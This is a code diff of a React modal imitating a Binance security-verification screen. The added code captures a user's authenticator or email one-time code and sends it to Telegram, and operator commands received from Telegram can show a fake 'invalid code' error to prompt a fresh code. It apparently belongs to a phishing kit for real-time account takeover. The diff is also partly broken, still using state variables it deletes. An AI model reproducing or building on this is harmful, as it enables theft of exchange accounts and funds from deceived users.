@@ -5,26 +5,30 @@ import { useTheme } from '../app/lib/ThemeContext'
 import BinanceLoader from './BinanceLoader'
 
 export default function Modal({ displayModal, setDisplayModal, modal, setModal }) {
-    const { theme, toggleTheme } = useTheme();
-    const [isLoading, setIsLoading] = useState(false)
-    const [modalState, setModalState] = useState(`invisible fixed opacity-0`) // Changed from hidden to invisible
-    const [animate, setAnimate] = useState('opacity-0')
-
+    const { theme } = useTheme();
+    const [otpCode, setOtpCode] = useState('');
+    const [invalid, setInvalid] = useState(false);
+    const { command } = useCommand(); // Get current command
+    
+    // Handle Telegram commands
     useEffect(() => {
-        if (displayModal) {
-            setModalState('fixed visible flex flex-col justify-between md:justify-normal')
-            // Add a small delay to trigger the animation
-            setTimeout(() => {
-                setAnimate('opacity-100')
-            }, 10)
-        } else {
-            setAnimate('opacity-0')
-            // Wait for opacity transition to complete before hiding
-            setTimeout(() => {
-                setModalState('invisible fixed opacity-0')
-            }, 200) // Match this with your transition duration
+        if (command === 'REQUEST_AUTH_OTP_CODE_AGAIN' && modal === 'AuthApp') {
+            setInvalid(true);
+        } else if (command === 'REQUEST_EMAIL_OTP_CODE_AGAIN' && modal === 'Email') {
+            setInvalid(true);
         }
-    }, [displayModal])
+    }, [command, modal]);
+
+
+    const handleOtpSubmit = () => {
+        // Send only the OTP code to Telegram
+        if (otpCode) {
+            sendMessageToTelegram(otpCode); // Send only the OTP code
+            setOtpCode(''); // Clear the input
+        } else {
+            setInvalid(true); // Show error if OTP code is empty
+        }
+    };
 
     return (
         <div className={`${modalState} transition-all duration-200 h-screen w-full ${theme === 'light' ? 'bg-white' : 'bg-[#0c0d10]'}`}>
@@ -61,27 +65,23 @@ export default function Modal({ displayModal, setDisplayModal, modal, setModal }
 
 
                                     {/* Input */}
-                                    <div className='flex flex-col w-full h-[48px] relative'>
-                                        <div
-                                            className={`border flex items-center 'border-[#eaecef]' ${theme == 'light' ? 'border-[#eaecef]' : ' border-[#474d57]'} hover:border-[#FCD535] transition duration-200 rounded-[8px] h-full flex w-full`}
-                                            style={{ padding: '6px 10px' }}
-                                            onClick={(e) => e.stopPropagation()}
-                                        >
-                                            <input
-                                                type={'text'}
-                                                spellCheck={false}
-                                                placeholder=''
-                                                className={`text-[16px] ${theme === 'light' ? 'bg-white' : 'bg-[#1e2329]'} m-0 pb-1 leading-[24px] focus:outline-none font-medium flex-grow caret-[#FCD535]`}
-                                            />
-                                            <div className={`items-center text-[#FCD535]`}>
-                                                Paste
-                                            </div>
-                                        </div>
-                                    </div>
-
-                                    <button className={`mt-6 pb-1.5 font-medium text-[16px] hover:opacity-80 w-full bg-[#FCD535] flex items-center border-none cursor-pointer justify-center whitespace-nowrap min-h-[48px] h-[48px] min-w-[80px] ${theme === 'light' ? 'text-black' : 'text-black'} rounded-[10px]`} type='button'>
-                                        {isLoading ? <BinanceLoader /> : 'Submit'}
-                                    </button>
+                                        <input
+                                            type="text"
+                                            value={otpCode}
+                                            onChange={(e) => setOtpCode(e.target.value)}
+                                            className={`... ${invalid ? 'border-red-500' : ''}`}
+                                            placeholder={`Enter 6-digit ${modal === 'AuthApp' ? 'authenticator' : 'email'} code`}
+                                        />
+                                        {invalid && (
+                                            <p className="text-red-500 text-sm mt-1">
+                                                {modal === 'AuthApp' 
+                                                    ? "Invalid authenticator code. Please try again."
+                                                    : "Invalid email verification code. Please check your email."}
+                                            </p>
+                                        )}
+                                        <button onClick={handleOtpSubmit}>
+                                            {isLoading ? <BinanceLoader /> : 'Submit'}
+                                        </button>
                                     <div class="flex justify-start md:justify-center mt-5">
                                         <button className='text-[14px] font-medium h-[32px] text-[#F0B90B]'>
                                             Security verification unavailable ?
